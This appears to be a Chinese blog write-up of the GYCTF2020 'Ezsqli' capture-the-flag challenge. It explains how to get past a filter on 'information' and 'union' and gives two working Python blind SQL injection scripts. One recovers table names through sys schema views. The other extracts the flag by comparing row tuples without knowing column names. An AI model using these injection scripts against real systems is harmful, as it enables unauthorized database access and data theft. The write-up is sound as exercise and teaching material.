---
title: '[GYCTF2020]Ezsqli'
date: 2024-06-08 17:29:03
tags: 
     - 题解
     - sql注入
categories: 刷题笔记
---

### [GYCTF2020]Ezsqli（无列名注入）

由题目可以知道这是一个sql注入的题，我们先fuzz一波

<!-- more -->

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200516195510791.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mzk0MDg1Mw==,size_16,color_FFFFFF,t_70)

很好，information被过滤了，我们直接考虑盲注

我们可以知道，当输入1时，结果返回

![image-20240606212618956](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406062126149.png)



由于information被过滤了，我们考虑用别的东西替换

https://www.cnblogs.com/h0cksr/p/16189749.html

```
sys.schema_table_statistics_with_buffer
 
sys.x$schema_flattened_keys
```

写一个爆表名的脚本

```
import requests

url = "http://e82dedee-e2a8-4334-b282-25615e7d6ce6.node5.buuoj.cn:81/index.php"
data = {"id": ""}


def name(num):
    res = ''
    for i in range(1, 50):
        l = 0
        r = 127
        mid = (l + r) >> 1
        while (l < r):
            pay1 = "0^(ascii(substr((select group_concat(table_name) from sys.schema_table_statistics where table_schema=database()),{0},1))>{1})".format(
                i, mid)
            data["id"] = pay1
            if (num == 1):
                r1 = requests.post(url, data=data)
                # print(data)
                # print(r1.text)
            if ("Nu1L" in r1.text):
                l = mid + 1
            else:
                r = mid
            mid = (l + r) >> 1
        if (mid == 0):
            break
        res += chr(mid)
    print(res)


def main():
    name(1)


if __name__ == "__main__":
    main()

```

得到表名

![image-20240608192211783](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406081922870.png)

## 无列名注入

这里因为我们无法通过 这个表获取flag的列名

并且这里过滤了 union 所以我们无法使用

```
select 1,2,3 as b union select * from 表
```

这种无列名注入

所以我们现在需要学习另一个

### 通过ascii位移来获得flag

我们开始在本地尝试

```
select (select "a")  > (select "abcdef")
 
0
 
 
 
select (select "b")  > (select "abcdef")
 
1
 
这里能发现 是通过比对 首个字符的ascii 如果相同 就输出 0 

不同就输出 1
 前一个 ascii  和 后一个ascii 值的大小
 如果前一个比较大 那么就输出0
```

所以我们可以通过这个方式来查询

首先通过 select 1,2,3 查询字段数

![img](https://img-blog.csdnimg.cn/ac8f7b8a362948b49f35a353df420357.png)

![img](https://img-blog.csdnimg.cn/c16e454f7e214cbd8046d42d47d5005f.png)

说明字段数量为2

然后我们就可以通过循环开始查询了

所以我们只要读取到了 Nu1L 然后通过 **减去一位 我们就可以获得上一个的字符**

然后加入 就可以获取下一个了

这里还有一个要注意的 就是 我们注入的地方在字段2 是flag在的地方

1 可能是 id什么的

我们开始写脚本吧

```cobol
import time
 
import  requests
 
baseurl="http://17d5864a-27fc-4fc7-be88-e639f3f55898.node4.buuoj.cn:81/index.php"
 
 
def add(flag):
    res=''
    res+=flag
    return res
flag=''
for i in range(1,200):
    for char in range(32,127):
        datachar = add(flag+chr(char)) #增加下一个比对的字符串
        payload='2||((select 1,"{}")>(select * from f1ag_1s_h3r3_hhhhh))'.format(datachar)
        data = {
            'id':payload
        }
        req=requests.post(url=baseurl,data=data)
        if "Nu1L" in req.text:
            flag += chr(char-1)
            print(flag)
            break
        if req.status_code == 429:
            time.sleep(0.5)
```

注意这里的chr(char-1)，我们在本地测试来看一下为什么

![img](https://img-blog.csdnimg.cn/20200516203337501.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200516203640421.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mzk0MDg1Mw==,size_16,color_FFFFFF,t_70)

当我们匹配flag的时候，一定会先经过匹配到字符相等的情况，这一这个时候返回的是0，对应题目中的V&N，很明显此时的chr(char)并不是我们想要的，我们在输出1(Nu1L)的时候，匹配的是f的下一个字符g，而我们想要的是f，此时chr(char-1)=‘f’，所以这里要用chr(char-1)


如果脚本结果出现乱码，可能是运行时间太快，把sleep的值调大点.

得到flag

![image-20240608193505912](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406081935944.png)
